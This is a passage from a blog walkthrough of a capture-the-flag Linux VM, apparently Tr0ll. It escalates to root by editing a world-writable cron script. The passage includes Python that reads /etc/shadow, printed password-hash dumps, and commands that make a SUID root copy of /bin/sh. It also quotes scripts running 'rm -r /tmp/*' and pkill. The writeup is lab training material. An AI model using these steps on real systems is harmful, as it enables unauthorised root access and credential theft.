alternatives.log.1  dist-upgrade  fail2ban.log.1  upstart
apache2         dmesg     faillog     vmware-tools-upgrader.log
apt         dmesg.0   fsck        vsftpd.log
auth.log        dmesg.1.gz    installer   vsftpd.log.1
auth.log.1      dmesg.2.gz    kern.log    wtmp
boot.log        dmesg.3.gz    kern.log.1      wtmp.1
bootstrap.log       dmesg.4.gz    lastlog
btmp            dpkg.log      syslog
btmp.1          dpkg.log.1    syslog.1
$ cd /var/log
$ cat cronlog
*/2 * * * * cleaner.py
</code></p>

<p>So, that cleaner.py file seems to be a likely culprit. I searched for it and I found something interesting:</p>

<p>``` plain
$ locate cleaner.py
/lib/log/cleaner.py
/var/tmp/cleaner.py.swp
$ cat /lib/log/cleaner.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os
import sys
try:</p>

<pre><code>os.system('rm -r /tmp/* ')
</code></pre>

<p>except:</p>

<pre><code>sys.exit()
</code></pre>

<p>$ cat /var/tmp/cleaner.py.swp
crontab for cleaner.py successful
```</p>

<p>Ok, so this cleaner deletes all the contents of the <code>/tmp/</code> folder. The great part about it though, is the wonderful permissions it has:</p>

<p><code>plain
$ ls -l /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13 00:13 /lib/log/cleaner.py
</code></p>

<p>So we can modify it to help in compromising the system. First thing I did was add the following code to copy the contents of the <code>/etc/shadow</code> file to a txt file in the <em>/tmp/</em> folder:</p>

<p>``` python
with open(&lsquo;/etc/shadow&rsquo;, &lsquo;r&rsquo;) as shadow:</p>

<pre><code>juicy = shadow.read()
</code></pre>

<p>with open(&lsquo;/tmp/hashes.txt&rsquo;, &lsquo;a&rsquo;) as hashes:</p>

<pre><code>hashes.write(juicy)
</code></pre>

<p>```</p>

<p>Now we have the password hashes and we could crack them if we wanted:</p>

<p><code>plain
$ cat /tmp/hashes.txt
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
messagebus:*:16291:0:99999:7:::
troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
sshd:*:16291:0:99999:7:::
ftp:*:16292:0:99999:7:::
lololol:!:16292:0:99999:7:::
overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
</code></p>

<p>But I am not a fan of cracking passwords, if it can be avoided. And in this case, we still have the other Python file to check. So I modified the cleaner code again:</p>

<p>``` python
with open(&lsquo;/opt/lmao.py&rsquo;, &lsquo;r&rsquo;) as lmao:</p>

<pre><code>lol = lmao.read()
</code></pre>

<p>with open(&lsquo;/tmp/lol.py&rsquo;, &lsquo;a&rsquo;) as rofl:</p>

<pre><code>rofl.write(lol)
</code></pre>

<p>```</p>

<p>And after a little bit of waiting, we finally have the culprit that is killing our shells:</p>

<p>``` plain
$ cat /tmp/lol.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os</p>

<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
sys.exit()
```</p>

<p>Ok, now let&rsquo;s finish by getting a shell. We can leverage the cleaner file to copy the shell executable and give it outrageously lax permissions and SUID bit. Note that I&rsquo;m not saying bash, because the shell being used here is the <em>sh</em> shell.</p>

<p><code>plain
$ echo $SHELL
/bin/sh
</code></p>

<p>Here is the simple code for copying the shell file to <em>/tmp/</em> and letting everyone run it with root permissions:</p>

<p>``` python
import os</p>

<p>os.system(&lsquo;cp /bin/sh /tmp/trolled&rsquo;)
os.system(&lsquo;chmod 4777 /tmp/trolled&rsquo;)
```</p>

<p>Now just wait for cron. Check the loot and pwn the troll!</p>

<p>``` plain
$ ls -l /tmp/trolled
-rwsrwxrwx 1 root root 112204 Feb  3 04:50 /tmp/trolled
$ /tmp/trolled</p>

<h1>whoami</h1>

<p>root</p>

<h1>ls /root/</h1>

<p>proof.txt</p>

<h1>cat /root/proof.txt</h1>

<p>Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

<p>Alternatively, since the original objective was only to read the proof file, you can just use the cleaner file to do it, providing you know the name of the proof file:</p>

<p>``` python
with open(&lsquo;/root/proof.txt&rsquo;, &lsquo;r&rsquo;) as proof:</p>

<pre><code>win = proof.read()
</code></pre>

<p>with open(&lsquo;/tmp/proof.txt&rsquo;, &lsquo;a&rsquo;) as pwned:</p>

<pre><code>pwned.write(win)
</code></pre>

<p>```</p>

<p>And here it is:</p>

<p>``` plain
$ cat /tmp/proof.txt
Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
```</p>

<p>Fortune cookie:</p>

<blockquote><p>He that breaks a thing to find out what it is has left the path of wisdom.
  &mdash; J.R.R. Tolkien</p></blockquote>

<p><strong>Random rant</strong></p>

<p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>

<p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
]]></content>
  </entry>
  
</feed>
